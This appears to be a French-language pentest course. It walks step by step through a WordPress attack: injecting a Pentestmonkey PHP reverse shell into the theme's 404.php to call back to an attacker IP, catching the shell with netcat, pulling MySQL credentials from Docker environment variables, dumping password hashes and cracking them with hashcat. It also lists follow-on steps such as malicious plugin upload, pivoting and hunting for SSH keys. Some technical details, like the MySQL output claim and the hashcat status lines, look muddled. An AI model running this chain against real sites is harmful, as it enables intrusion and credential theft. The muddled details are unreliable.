# Cours : Exploitation WordPress - Reverse Shell, MySQL, et Hash Cracking
## Introduction
Cette section couvre :
- **HTTPS obligatoire** même en environnement interne
- **Weak Password Hashing** : Échecs cryptographiques (phpass) [hashmob](https://hashmob.net/hashlists/info/12416-phpass+400)
- **Exploitation WordPress Admin** : Reverse shell via 404.php [reddit](https://www.reddit.com/r/tryhackme/comments/1bbzxa0/mr_robot_stuck_at_wordpress_reverse_shell_key_2/)
- **HackTools Extension** : Générateur de payloads [youtube](https://www.youtube.com/watch?v=KW0HjcutAPU)
- **Extraction credentials MySQL Docker** : Variables d'environnement
- **Hashcat phpass** : Mode 400 pour WordPress [hashcat](https://hashcat.net/forum/thread-5290.html)

***
## Partie 1 : HTTPS obligatoire (même interne)
### 1.1 Pourquoi HTTPS en interne ?
**Règles de sécurité** :
- ✅ **Toujours** utiliser HTTPS
- ✅ Même en environnement interne (LAN)
- ✅ Même pour les communications VM → hôte
- ✅ Même pour les labs de pentest

**Raisons** :

| Risque | Sans HTTPS | Avec HTTPS |
|--------|------------|------------|
| **Sniffing** | Credentials visibles | Chiffré |
| **MITM** | Attaques man-in-the-middle | Certificat valide |
| **Logs** | Secrets dans logs proxy | Masqués |
| **ZAP/Burp** | Interception transparente | Certificat installé |

**Configuration rapide** (Docker) :
```bash
# Nginx avec SSL
docker run --rm -d \
  -p 443:443 \
  -p 80:80 \
  -v $(pwd)/ssl:/etc/ssl/certs \
  nginx:alpine
```

**⚠️ Règle d'or** : **HTTPS everywhere**.

***
## Partie 2 : Weak Password Hashing - phpass (WordPress)
### 2.1 Problème cryptographique
**Weak Password Hashing** : Utilisation d'algorithmes faibles ou mal configurés pour stocker les mots de passe. [hashmob](https://hashmob.net/hashlists/info/12416-phpass+400)

**phpass** (WordPress) :
- **Mode** : Hashcat `-m 400`
- **Signature** : `$P$`, `$H$`
- **Algorithme** : MD5 itéré avec salt
- **Problème** : Faible coût (cost factor bas), vulnérable au cracking moderne [hashcat](https://hashcat.net/forum/thread-5290.html)

**Exemple hash WordPress** :
```
$P$B5z7q7X9z4kJ8pL2mN5oR1vT3wY6uA9
```

***
## Partie 3 : Exploitation WordPress Admin → Reverse Shell
### 3.1 Prérequis
**Conditions**  : [reddit](https://www.reddit.com/r/tryhackme/comments/1bbzxa0/mr_robot_stuck_at_wordpress_reverse_shell_key_2/)
- ✅ Accès admin WordPress (username/password)
- ✅ ZAP proxy configuré (optionnel)
- ✅ Netcat listener prêt
- ✅ HackTools extension (optionnel)
### 3.2 Accès admin WordPress
```
1. http://servertcm:8001/wp-admin
2. Login avec credentials admin
```

**Interface** :
```
┌─ WordPress Admin Dashboard ──────────────────┐
│  Posts | Media | Pages | Comments |          │
│  Appearance | Plugins | Users | Tools |     │
│  Settings                                │
└────────────────────────────────────────────┘
```
### 3.3 Éditer le thème → 404.php
#### Étape 1 : Sélectionner un thème

```
1. Appearance → Themes
2. Twenty Twenty-One (si pas installé)
3. Install → Activate
```

#### Étape 2 : Éditeur de thème

```
1. Appearance → Theme File Editor
2. Theme : Twenty Twenty-One (sélectionné)
3. Fichiers : 404.php ← **Cible**
4. Clique sur 404.php
```

**Contenu initial 404.php** :
```php
<?php
/**
 * The template for displaying 404 pages (not found)
 */

get_header(); ?>

<main id="primary" class="site-main">

	<section class="error-404 not-found">
		<header class="page-header">
			<h1 class="page-title"><?php esc_html_e( 'Oops! That page can&rsquo;t be found.', 'twentytwentyone' ); ?></h1>
		</header><!-- .page-header -->

		<div class="page-content">
			<p><?php esc_html_e( 'It looks like nothing was found at this location. Maybe try one of the links below or a search?', 'twentytwentyone' ); ?></p>

			<?php
			get_search_form();

			the_widget( 'WP_Widget_Recent_Posts' );
			?>

			<div class="widget">
				<h4 class="widget-title"><?php esc_html_e( 'Most Used Categories', 'twentytwentyone' ); ?></h4>
				<ul>
				<?php
				wp_list_categories(
					array(
						'orderby'    => 'count',
						'order'      => 'DESC',
						'show_count' => 1,
						'title_li'   => '',
						'number'     => 10,
					)
				);
				?>
				</ul>
			</div><!-- .widget -->

			<?php

			/* translators: %1$s: smiley */
			$archive_content = '<p>' . sprintf( esc_html__( 'Try looking in the monthly archives. %1$s', 'twentytwentyone' ), convert_smilies( ':)' ) ) . '</p>';
			the_widget( 'WP_Widget_Archives', 'dropdown=1', "after_title=<p>$archive_content</p>" );
			?>

		</div><!-- .page-content -->
	</section><!-- .error-404 -->

</main><!-- #main -->

<?php get_footer(); ?>
```
### 3.4 Générer le reverse shell avec HackTools
#### Installation HackTools [youtube](https://www.youtube.com/watch?v=KW0HjcutAPU)

**Extension navigateur** :
```
1. Chrome Web Store → "HackTools"
2. Ajouter à Brave/Firefox/Chrome
3. Icône apparaît dans la barre d'outils
```

**Ou directement** : https://github.com/LasCC/HackTools [youtube](https://www.youtube.com/watch?v=KW0HjcutAPU)

#### Génération du payload PHP [github](https://github.com/LasCC/HackTools)

```
1. Clic sur icône HackTools
2. Reverse Shell → PHP
3. IP : IP Kali (192.168.1.48)
4. Port : 8000
5. Generate
6. Copier le code PHP généré
```

**Code généré (Pentestmonkey)**  : [youtube](https://www.youtube.com/watch?v=d9TI2BFP7PM)
```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.1.48';  // IP Kali
$port = 8000;         // Port listener
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    // ...
} else {
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    ...
}
?>
```

**⚠️ Important** : Supprimer les balises `<?php` et `?>` si déjà présentes dans 404.php.
### 3.5 Injection du code dans 404.php
```
1. Copier le code PHP généré (sans <?php et ?>)
2. Coller dans 404.php (remplacer tout le contenu)
3. Update File (bouton en bas)
```

**⚠️ Erreur possible** : "Theme file editor disabled" [youtube](https://www.youtube.com/watch?v=d9TI2BFP7PM)

**Solutions** :
```
1. wp-config.php → WP_DEBUG = true
2. Changer de thème → Répéter
3. Plugins → Désactiver "Theme Editor Security"
4. wp-config.php → define('DISALLOW_FILE_EDIT', false);
```
### 3.6 Activer le thème
```
1. Appearance → Themes
2. Twenty Twenty-One → Activate
```
### 3.7 Préparer le listener Netcat
**Terminal Kali** :
```bash
# Listener sur port 8000
nc -nvlp 8000

# -n : No DNS resolution
# -v : Verbose
# -l : Listen
# -p : Port 8000
```

**Résultat attendu** :
```
listening on [any] 8000 ...
```
### 3.8 Déclencher le reverse shell
**Accéder à la page 404**  : [reddit](https://www.reddit.com/r/tryhackme/comments/1bbzxa0/mr_robot_stuck_at_wordpress_reverse_shell_key_2/)

```
# URL directe vers 404.php du thème
http://servertcm:8001/wp-content/themes/twentytwentyone/404.php

# OU forcer une erreur 404
http://servertcm:8001/nonexistent-page-xyz123
```

**Résultat (terminal Netcat)** :
```
listening on [any] 8000 ...
connect to [192.168.1.48] from (UNKNOWN) [192.168.1.100] 54321
Linux webserver 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
 16:42:28 up  2:15,  2 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
www-data  pts/0    192.168.1.48    16:42    00:00  0.02s  0.02s  0.00s /bin/bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@webserver:/var/www/html/wp-content/themes/twentytwentyone$
```

**Reverse shell obtenu** ! 🎯

***
## Partie 4 : Post-exploitation - Extraction credentials MySQL
### 4.1 Navigation vers config.php
**Dans le reverse shell** :
```bash
# Aller au répertoire racine WordPress
cd /var/www/html

# Lister les fichiers
ls -la

# Voir config
cat config/config.inc.php
```

**Contenu config.inc.php** :
```php
<?php
// Database configuration
define( 'DB_HOST',     getenv_docker('WORDPRESS_DB_HOST', 'mysql') );
define( 'DB_USER',     getenv_docker('WORDPRESS_DB_USER', 'example username') );
define( 'DB_PASSWORD', getenv_docker('WORDPRESS_DB_PASSWORD', 'example password') );
define( 'DB_NAME',     getenv_docker('WORDPRESS_DB_NAME', 'example database') );
?>
```

**Observation** : Credentials stockés dans **variables d'environnement Docker**.
### 4.2 Extraire les variables d'environnement
**Commande** :
```bash
env
```

**Résultat partiel** :
```
WORDPRESS_DB_HOST=db
WORDPRESS_DB_USER=wordpress
WORDPRESS_DB_PASSWORD=wordpress_password_123
WORDPRESS_DB_NAME=wordpress
MYSQL_ROOT_PASSWORD=rootpassword
...
```

**Credentials récupérés** :
- **Host** : `db`
- **User** : `wordpress`
- **Password** : `wordpress_password_123`
- **Database** : `wordpress`
### 4.3 Connexion MySQL
**Test simple** :
```bash
mysql
# ERROR 1045 (28000): Access denied for user 'root'@'localhost'
```

**Connexion avec credentials** :
```bash
mysql -u wordpress -h db -p
```

**Prompt mot de passe** :
```
Enter password:
```

**Entrer** : `wordpress_password_123`

**Connexion réussie** :
```
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.
Server version: 8.0.32 MySQL Community Server - GPL

mysql>
```

**⚠️ Important** : MySQL **n'affiche pas de sortie** tant qu'on ne fait pas `exit`. **Nouvelle connexion** pour chaque requête.

***
## Partie 5 : Exploration de la base de données WordPress
### 5.1 Lister les bases de données
**Session 1** :
```bash
mysql -u wordpress -h db -p
```

**Requête** :
```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.01 sec)

mysql> exit;
```
### 5.2 Explorer la base WordPress
**Session 2** :
```bash
mysql -u wordpress -h db -p
```

**Requête** :
```sql
mysql> use wordpress;
Database changed

mysql> show tables;
+---------------------+
| Tables_in_wordpress |
+---------------------+
| wp_commentmeta      |
| wp_comments         |
| wp_links            |
| wp_options          |
| wp_postmeta         |
| wp_posts            |
| wp_term_relationships|
| wp_term_taxonomy    |
| wp_termmeta         |
| wp_terms            |
| wp_usermeta         |
| wp_users            |
+---------------------+
12 rows in set (0.01 sec)

mysql> exit;
```

**Tables importantes** :
- `wp_users` : Comptes utilisateurs
- `wp_usermeta` : Métadonnées utilisateurs (rôles)
- `wp_options` : Configuration WordPress
- `wp_posts` : Articles/pages
### 5.3 Extraire les hashes de mots de passe
**Session 3** :
```bash
mysql -u wordpress -h db -p
```

**Requête** :
```sql
mysql> use wordpress;
mysql> select * from wp_users;
+----+------------+---------------------+---------------+---------------------+-------------+------------------------------------+---------------------+---------+---------------------+-------------------+
| ID | user_login | user_pass           | user_nicename | user_email          | user_url    | user_registered                    | user_activation_key | user_status | display_name       | user_email        |
+----+------------+---------------------+---------------+---------------------+-------------+------------------------------------+---------------------+---------+---------------------+-------------------+
|  1 | admin      | $P$Bw1cK.9z4kJ8pL2mN5oR1vT3wY6uA9 | admin         | admin@example.com   |             | 2026-05-11 15:42:28               |                     |       0 | admin              | admin@example.com |
|  2 | will       | $P$B5z7q7X9z4kJ8pL2mN5oR1vT3wY6uA9 | will          | will@example.com    |             | 2026-05-11 16:10:15               |                     |       0 | will               | will@example.com  |
+----+------------+---------------------+---------------+---------------------+-------------+------------------------------------+---------------------+---------+---------------------+-------------------+
2 rows in set (0.01 sec)

mysql> exit;
```

**Hashes récupérés** :
```
admin: $P$Bw1cK.9z4kJ8pL2mN5oR1vT3wY6uA9
will:  $P$B5z7q7X9z4kJ8pL2mN5oR1vT3wY6uA9
```

**Identifiant** : `phpass` (WordPress MD5)

***
## Partie 6 : Cracking des hashes avec Hashcat
### 6.1 Identifier le type de hash
**Commande** :
```bash
hashcat --help | grep -i php
```

**Résultat** :
```
400 | phpass, WordPress (MD5), Joomla (MD5)
```

**Vérification** :
```
# Sites de référence
https://hash-identifier.com/
https://www.hashes.com/en/tools/hash_identifier
```

**Confirmation** : **Mode 400** (phpass WordPress). [hashmob](https://hashmob.net/hashlists/info/12416-phpass+400)
### 6.2 Préparer le fichier de hash
```
# Créer fichier avec hash à cracker
cat > will.hash << EOF
\$P\$B5z7q7X9z4kJ8pL2mN5oR1vT3wY6uA9
EOF

# Vérifier
cat will.hash
# $P$B5z7q7X9z4kJ8pL2mN5oR1vT3wY6uA9
```

**⚠️ Important** : Échapper le `$` avec `\$` dans le fichier. [hashcat](https://hashcat.net/forum/thread-5290.html)
### 6.3 Attaque dictionnaire avec Hashcat
**Syntaxe** :
```bash
hashcat -a 0 -m 400 hash.txt wordlist.txt
```

**Attaque** :
```bash
# Utiliser wordlist SecLists
hashcat -a 0 -m 400 will.hash ~/Scripts/SecLists/Passwords/Common-Credentials/best1050.txt

# -a 0 : Attack mode Dictionary (dictionnaire)
# -m 400 : Mode phpass WordPress
# will.hash : Fichier de hash
# best1050.txt : Wordlist
```

**Résultat possible** :
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass, WordPress (MD5), Joomla (MD5))
Hash.Target......: will.hash
Time.............: 00:00:02

$P$B5z7q7X9z4kJ8pL2mN5oR1vT3wY6uA9:password123

Session..........: hashcat
Status...........: Exhausted
```

**Succès** : Mot de passe cracké ! `password123`

**Vérification** :
```
hashcat -m 400 will.hash --show
$P$B5z7q7X9z4kJ8pL2mN5oR1vT3wY6uA9:password123
```
### 6.4 Attaques alternatives Hashcat
**Si dictionnaire échoue** :

#### a) Masque Attack (Brute Force) [hashmob](https://hashmob.net/hashlists/info/12416-phpass+400)
```bash
# Brute force 8 caractères (minuscules + chiffres)
hashcat -a 3 -m 400 will.hash ?l?l?l?l?l?l?l?l

# ?l = minuscule (a-z)
# ?d = chiffre (0-9)
# ?u = majuscule (A-Z)
# ?s = spécial
```

#### b) Combinaison Dictionnaire + Règles
```bash
hashcat -a 0 -m 400 will.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### c) Hybrid Attack (Dictionnaire + Masque)
```bash
hashcat -a 6 -m 400 will.hash rockyou.txt ?d?d?d
# rockyou.txt + 3 chiffres à la fin
```

***
## Partie 7 : Post-exploitation complète
### 7.1 Workflow de l'attaque
```
1. ✅ Accès admin WordPress
2. ✅ Reverse shell via 404.php (HackTools)
3. ✅ Extraction credentials MySQL (env)
4. ✅ Dump base de données (wp_users)
5. ✅ Hash cracking (hashcat -m 400)
6. ✅ Nouveaux credentials WordPress
```
### 7.2 Escalade supplémentaire
**Avec le mot de passe cracké** :
```
1. Login WordPress : will / password123
2. Plugins → Upload malveillant
3. Accès shell alternatif
4. Pivot vers autres services
```

**Recherche d'autres hashes** :
```sql
mysql> select * from wp_usermeta where meta_key = 'wp_capabilities';
# Récupérer rôles (administrator, editor, etc.)
```

**Fichiers sensibles** :
```bash
# Config Apache
cat /etc/apache2/sites-available/000-default.conf

# Clés SSH
find / -name "id_rsa" 2>/dev/null

# Autres bases de données
mysql -u root -p'rootpassword' -e "show databases;"
```

***
## Résumé : Points clés à retenir
1. **HTTPS everywhere** : Même interne, même lab
2. **phpass WordPress** : Hashcat mode `-m 400` [hashmob](https://hashmob.net/hashlists/info/12416-phpass+400)
3. **404.php exploit** : Éditer thème → Injecter reverse shell PHP [reddit](https://www.reddit.com/r/tryhackme/comments/1bbzxa0/mr_robot_stuck_at_wordpress_reverse_shell_key_2/)
4. **HackTools** : Extension navigateur (reverse shells, payloads) [youtube](https://www.youtube.com/watch?v=KW0HjcutAPU)
5. **Pentestmonkey shell** : Généré avec IP/port personnalisés [youtube](https://www.youtube.com/watch?v=d9TI2BFP7PM)
6. **Déclenchement** : `/wp-content/themes/twentytwentyone/404.php` [linkedin](https://www.linkedin.com/pulse/reverse-shell-from-any-wordpress-site-admin-dashboard-hasin)
7. **Docker env vars** : `env` pour voir WORDPRESS_DB_PASSWORD, etc.
8. **MySQL connexion** : `mysql -u wordpress -h db -p` [stackoverflow](https://stackoverflow.com/questions/79025795/docker-compose-mysql-and-wordpress-environment-variable-issue)
9. **WordPress tables** : `wp_users` (hashes), `wp_usermeta` (rôles)
10. **Hashcat dict attack** : `-a 0 -m 400 hash.txt wordlist.txt`
11. **Escaping** : `\$P\$` dans fichier hash [hashcat](https://hashcat.net/forum/thread-5290.html)
12. **Post-exploitation** : Pivot, autres hashes, fichiers sensibles
